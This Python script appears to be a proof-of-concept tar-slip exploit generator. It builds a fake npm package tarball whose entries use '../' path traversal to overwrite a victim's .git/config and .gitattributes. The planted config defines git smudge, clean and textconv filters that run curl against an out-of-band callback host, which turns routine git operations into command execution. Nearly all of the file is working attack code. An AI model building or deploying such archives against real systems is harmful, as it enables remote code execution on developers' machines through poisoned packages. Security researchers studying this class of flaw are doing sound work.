#!/usr/bin/env python3
"""
Tar-slip attack: Create tarball with path traversal to overwrite .git/config
This exploits tar extraction that doesn't sanitize '../' in filenames
"""

import tarfile
import io
import os

OAST_ENDPOINT = "juolbtoughjktrdppdvuqemhwftehn8z6.oast.fun"

def create_tarslip_tarball():
    output_file = os.path.join(os.path.dirname(__file__), 'evil.tar.gz')
    tar = tarfile.open(output_file, 'w:gz')

    # Normal package.json (npm expects this)
    pkg_json = b'''{
  "name": "evil-pkg",
  "version": "1.0.0",
  "main": "index.js"
}'''
    info = tarfile.TarInfo(name='package/package.json')
    info.size = len(pkg_json)
    tar.addfile(info, io.BytesIO(pkg_json))

    # Normal index.js
    index_js = b'''// This code runs when require()'d
console.log("[*] evil-pkg loaded");
module.exports = { loaded: true, timestamp: Date.now() };
'''
    info = tarfile.TarInfo(name='package/index.js')
    info.size = len(index_js)
    tar.addfile(info, io.BytesIO(index_js))

    # MALICIOUS: Path traversal to overwrite .git/config
    # npm extracts to node_modules/evil-pkg/, so we need ../../.git/config
    # But the package is extracted to a temp dir first, so we try multiple levels
    git_config = f'''[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
[filter "exploit"]
    smudge = curl https://{OAST_ENDPOINT}/tar-slip-rce-smudge
    clean = curl https://{OAST_ENDPOINT}/tar-slip-rce-clean
[diff "exploit"]
    textconv = curl https://{OAST_ENDPOINT}/tar-slip-rce-diff
[remote "origin"]
    url = https://github.com/nirohfeld/dataform-poc.git
    fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
    remote = origin
    merge = refs/heads/main
'''.encode()

    # Try multiple traversal depths
    traversal_paths = [
        'package/../.git/config',           # 1 level up from package dir
        'package/../../.git/config',        # 2 levels up
        'package/../../../.git/config',     # 3 levels up
        'package/../../../../.git/config',  # 4 levels up
        'package/../../../../../.git/config', # 5 levels up
    ]

    for path in traversal_paths:
        info = tarfile.TarInfo(name=path)
        info.size = len(git_config)
        tar.addfile(info, io.BytesIO(git_config))
        print(f"[+] Added: {path}")

    # Also try to create .gitattributes to trigger the filter
    gitattributes = b'''* filter=exploit
* diff=exploit
'''
    for depth in range(1, 6):
        path = 'package/' + '../' * depth + '.gitattributes'
        info = tarfile.TarInfo(name=path)
        info.size = len(gitattributes)
        tar.addfile(info, io.BytesIO(gitattributes))
        print(f"[+] Added: {path}")

    tar.close()
    print(f"\n[*] Created: {output_file}")
    print(f"[*] Size: {os.path.getsize(output_file)} bytes")

    # Verify contents
    print("\n[*] Tarball contents:")
    with tarfile.open(output_file, 'r:gz') as t:
        for member in t.getmembers():
            print(f"    {member.name}")

if __name__ == '__main__':
    create_tarslip_tarball()
